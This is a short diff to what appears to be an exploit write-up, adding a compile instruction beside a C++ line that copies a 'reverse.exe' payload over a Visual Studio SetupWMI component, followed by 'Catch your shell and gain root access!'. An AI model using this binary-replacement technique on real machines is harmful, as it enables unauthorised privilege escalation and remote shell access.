@@ -304,6 +304,8 @@ to:
 CopyFile(L"c:\\temp\\reverse.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
 ```
 
+Compile the exploit with VS Code C++ Release on release mode.
+
 Catch your shell and gain root access!
 
 ### PostScript
